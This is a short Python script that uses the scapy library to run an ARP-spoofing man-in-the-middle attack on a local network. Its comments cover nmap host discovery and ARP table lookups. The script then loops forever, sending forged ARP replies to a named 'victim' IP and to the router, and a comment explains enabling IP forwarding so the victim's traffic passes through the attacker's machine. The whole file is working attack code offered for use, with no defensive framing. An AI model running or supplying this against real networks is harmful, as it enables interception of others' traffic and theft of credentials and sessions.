import scapy.all as scap
import time

# 1. nmap -sL 192.168.1.0/24
# discovery hosts on LAN

# 2. arp -e; arp -n
# to see ip <--> MAC address

# DONE! now you can easily automate!

ip_victim = "192.168.1.24"
hw_victim = "00:00:00:00:00:00"
ip_router = "192.168.1.1"
mac_router = "00:00:00:00:00:00"
while True:
    packet = scap.ARP(op=2, pdst=ip_victim, hwdst=hw_victim, psrc=ip_router)
    scap.send(packet)
    # op = 1 -> Who has 192.168.1.24? Tell 192.168.1.1
    # op = 2 -> 192.168.1.1 is at MAC_hacker

    packet = scap.ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_victim)
    scap.send(packet)

    # enable ip forwarding to make the victim receive its traffic
    # sudo sysctl -w net.ipv4.ip_forward=1
    # In this way your machine will act as a router.